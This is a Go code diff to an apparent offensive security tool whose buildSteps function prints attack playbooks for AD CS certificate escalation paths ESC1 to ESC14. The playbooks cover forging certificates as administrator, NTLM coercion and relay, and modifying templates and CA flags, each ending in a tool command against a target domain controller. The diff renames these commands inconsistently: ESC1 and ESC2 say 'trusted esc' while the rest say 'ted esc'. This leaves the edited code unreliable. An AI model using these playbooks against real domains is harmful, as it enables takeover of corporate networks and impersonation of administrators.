@@ -99,32 +99,32 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			fmt.Sprintf("Identify template: %s (enrollee supplies subject + auth EKU)", tmpl.Name),
 			"Request certificate with arbitrary SAN (e.g., administrator@" + cfg.Domain + ")",
 			"Use forged certificate for Kerberos PKINIT or Schannel authentication",
-			fmt.Sprintf("Command: trusted pki --esc 1 --template %s --upn administrator@%s --target-dc %s --domain %s",
-				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
+			fmt.Sprintf("Command: trusted esc 1 -t %s -U administrator@%s -d %s -dc %s",
+				tmpl.Name, cfg.Domain, cfg.Domain, cfg.TargetDC),
 		}
 	case "ESC2":
 		return []string{
 			fmt.Sprintf("Identify template: %s (Any Purpose EKU + enrollee supplies subject)", tmpl.Name),
 			"Request certificate with Any Purpose EKU — can be used as client auth",
 			"Authenticate as any user specified in the SAN",
-			fmt.Sprintf("Command: trusted pki --esc 2 --template %s --upn administrator@%s --target-dc %s --domain %s",
-				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
+			fmt.Sprintf("Command: trusted esc 2 -t %s -U administrator@%s -d %s -dc %s",
+				tmpl.Name, cfg.Domain, cfg.Domain, cfg.TargetDC),
 		}
 	case "ESC3":
 		return []string{
 			fmt.Sprintf("Identify template: %s (Certificate Request Agent EKU)", tmpl.Name),
 			"Stage 1: Enroll for enrollment agent certificate",
 			"Stage 2: Use agent certificate to enroll on behalf of target user",
-			fmt.Sprintf("Command: trusted pki --esc 3 --template %s --upn administrator@%s --target-dc %s --domain %s",
-				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
+			fmt.Sprintf("Command: ted esc 3 -t %s -U administrator@%s -d %s -dc %s",
+				tmpl.Name, cfg.Domain, cfg.Domain, cfg.TargetDC),
 		}
 	case "ESC13":
 		return []string{
 			fmt.Sprintf("Identify template: %s (issuance policy OID linked to security group)", tmpl.Name),
 			"Enroll in the template — the issued certificate contains the linked issuance policy OID",
 			"Authenticate via Kerberos PKINIT — the OID maps to group membership in the TGT",
-			fmt.Sprintf("Command: trusted pki --esc 13 --template %s --upn %s@%s --target-dc %s --domain %s",
-				tmpl.Name, cfg.Username, cfg.Domain, cfg.TargetDC, cfg.Domain),
+			fmt.Sprintf("Command: ted esc 13 -t %s -U %s@%s -d %s -dc %s",
+				tmpl.Name, cfg.Username, cfg.Domain, cfg.Domain, cfg.TargetDC),
 		}
 	case "ESC9":
 		return []string{
@@ -133,8 +133,8 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Request certificate from vulnerable template — cert lacks requester SID extension",
 			"Restore attacker's original UPN",
 			"Authenticate with issued certificate — DC maps cert to target UPN (no SID check)",
-			fmt.Sprintf("Command: trusted pki --esc 9 --template %s --upn administrator@%s --attacker-dn CN=%s,... --target-dc %s --domain %s",
-				tmpl.Name, cfg.Domain, cfg.Username, cfg.TargetDC, cfg.Domain),
+			fmt.Sprintf("Command: ted esc 9 -t %s -U administrator@%s --adn CN=%s,... -d %s -dc %s",
+				tmpl.Name, cfg.Domain, cfg.Username, cfg.Domain, cfg.TargetDC),
 		}
 	case "ESC4", "ESC4-CHECK":
 		return []string{
@@ -142,8 +142,8 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Modify template msPKI-Certificate-Name-Flag to enable ENROLLEE_SUPPLIES_SUBJECT",
 			"Exploit modified template as ESC1",
 			"Restore original template configuration",
-			fmt.Sprintf("Command: trusted pki --esc 4 --template %s --upn administrator@%s --target-dc %s --domain %s",
-				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
+			fmt.Sprintf("Command: ted esc 4 -t %s -U administrator@%s -d %s -dc %s",
+				tmpl.Name, cfg.Domain, cfg.Domain, cfg.TargetDC),
 		}
 	case "ESC6":
 		return []string{
@@ -151,8 +151,8 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Request certificate from any template with arbitrary SAN in request attributes",
 			"CA processes the SAN attribute regardless of template configuration",
 			"Authenticate with forged certificate as target user",
-			fmt.Sprintf("Command: trusted pki --esc 6 --template %s --upn administrator@%s --target-dc %s --domain %s",
-				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
+			fmt.Sprintf("Command: ted esc 6 -t %s -U administrator@%s -d %s -dc %s",
+				tmpl.Name, cfg.Domain, cfg.Domain, cfg.TargetDC),
 		}
 	case "ESC7":
 		return []string{
@@ -160,8 +160,8 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA",
 			"Exploit as ESC6 — request cert with arbitrary SAN",
 			"Restore original CA configuration",
-			fmt.Sprintf("Command: trusted pki --esc 7 --ca <CA_NAME> --upn administrator@%s --target-dc %s --domain %s",
-				cfg.Domain, cfg.TargetDC, cfg.Domain),
+			fmt.Sprintf("Command: ted esc 7 -c <CA_NAME> -U administrator@%s -d %s -dc %s",
+				cfg.Domain, cfg.Domain, cfg.TargetDC),
 		}
 	case "ESC8":
 		return []string{
@@ -178,8 +178,8 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Confirm StrongCertificateBindingEnforcement < 2",
 			"Obtain a certificate with authentication EKU from the template",
 			"Authenticate using the certificate — DC maps via weak UPN/S4U2Self method",
-			fmt.Sprintf("Command: trusted pki --esc 9 --template %s --upn administrator@%s --attacker-dn CN=%s,... --target-dc %s --domain %s",
-				tmpl.Name, cfg.Domain, cfg.Username, cfg.TargetDC, cfg.Domain),
+			fmt.Sprintf("Command: ted esc 9 -t %s -U administrator@%s --adn CN=%s,... -d %s -dc %s",
+				tmpl.Name, cfg.Domain, cfg.Username, cfg.Domain, cfg.TargetDC),
 		}
 	case "ESC11":
 		return []string{
@@ -187,7 +187,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Coerce NTLM authentication from a privileged account (e.g., PetitPotam, PrinterBug)",
 			"Relay coerced NTLM auth to the CA's RPC interface (ICertPassage/MS-ICPR)",
 			"Obtain certificate as the relayed principal",
-			"Command: certipy-ad relay -target rpc://<CA_HOSTNAME> -ca <CA_NAME>",
+			"Command: ted esc 11 -t <TEMPLATE> -U <UPN> -l <IP> -d <DOM> -dc <DC>",
 		}
 	case "ESC12":
 		return []string{
@@ -195,8 +195,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Confirm CA private key is stored on a network HSM or DCOM enrollment is unrestricted",
 			"Relay coerced NTLM auth to ICertRequest DCOM interface on the CA server",
 			"Request certificate via DCOM — bypasses web enrollment and RPC restrictions",
-			fmt.Sprintf("Command: certipy-ad relay -target dcom://%s -ca <CA_NAME> -template %s",
-				cfg.TargetDC, tmpl.Name),
+			"Command: ted esc 12 -t <TEMPLATE> -U <UPN> -l <IP> -d <DOM> -dc <DC>",
 		}
 	case "ESC14":
 		return []string{
